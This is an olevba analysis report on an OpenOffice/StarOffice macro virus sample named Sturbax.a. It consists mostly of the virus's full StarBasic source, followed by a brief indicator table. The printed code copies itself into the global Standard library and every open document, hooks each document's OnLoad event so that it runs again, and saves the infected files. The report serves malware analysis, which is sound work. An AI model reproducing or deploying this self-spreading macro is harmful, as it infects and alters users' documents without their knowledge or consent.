olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.StarOffice.Sturbax.a-2f14e7558f58a07064adb6c9259b8fb7b97798b1
Type: Text
-------------------------------------------------------------------------------
VBA MACRO Virus.StarOffice.Sturbax.a-2f14e7558f58a07064adb6c9259b8fb7b97798b1 
in file: Virus.StarOffice.Sturbax.a-2f14e7558f58a07064adb6c9259b8fb7b97798b1 - OLE stream: ''
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE script:module PUBLIC "-//OpenOffice.org//DTD OfficeDocument 1.0//EN" "module.dtd">
<script:module xmlns:script="http://openoffice.org/2000/script" script:name="starbucks" script:language="StarBasic">Sub Starbucks &apos;roy g biv - 06/06/06
set a=globalscope.basiclibraries.getbyname(&quot;Standard&quot;)
b=&quot;Starbucks&quot;
c=basiclibraries.getbyname(&quot;Standard&quot;).getbyname(b)
dim d(1) as new com.sun.star.beans.PropertyValue
d(0).name=&quot;EventType&quot;
d(0).value=&quot;StarBasic&quot;
d(1).name=&quot;Script&quot;
e=&quot;macro://&quot;
f=&quot;/Standard.&quot;+b+&quot;.&quot;+b+&quot;()&quot;
d(1).value=e+f
if not a.hasbyname(b)then
a.insertbyname b,c
createunoservice(&quot;com.sun.star.frame.GlobalEventBroadcaster&quot;).events.replacebyname &quot;OnLoad&quot;,d()
end if
d(1).value=e+&quot;.&quot;+f
e=createunoservice(&quot;com.sun.star.frame.Desktop&quot;).getcomponents.createenumeration
on error goto skip
while e.hasmoreelements
f=e.nextelement
g=f.basiclibraries.getbyname(&quot;Standard&quot;)
if not g.hasbyname(b)then
g.insertbyname b,c
f.events.replacebyname &quot;OnLoad&quot;,d()
f.store
end if
skip:
wend
End Sub

</script:module>
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|IOC       |http://openoffice.or|URL                                          |
|          |g/2000/script       |                                             |
+----------+--------------------+---------------------------------------------+

